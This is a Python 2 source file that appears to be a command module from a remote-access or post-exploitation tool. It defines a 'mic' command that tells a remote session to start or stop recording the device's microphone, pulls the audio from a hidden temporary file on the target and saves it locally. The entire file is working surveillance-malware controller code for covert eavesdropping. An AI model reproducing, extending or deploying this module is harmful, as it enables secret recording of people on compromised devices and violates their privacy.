import modules.helper as h
import json
import time
import os

class command:
    def __init__(self):
        self.name = "mic"
        self.description = "record mic"
        
    def run(self,session,cmd_data):
        # #print output        
        if cmd_data["args"] == "stop":
            # expect json
            result = json.loads(session.send_command(cmd_data))
            if 'error' in result:
                h.info_error("Error: " + result['error'])
            elif 'status' in result and result['status'] == 1:
                # download file
                data = session.download_file("/tmp/.avatmp")
                # save to file
                file_name = "mic{0}.caf".format(str(int(time.time())))
                h.info_general("Saving {0}".format(file_name))
                f = open(os.path.join('downloads',file_name),'w')
                f.write(data)
                f.close()
                h.info_general("Saved to ./downloads/{0}".format(file_name))
            
        elif cmd_data["args"] == "record":
            h.info_general(session.send_command(cmd_data))
        else:
            print "Usage: mic record/stop"
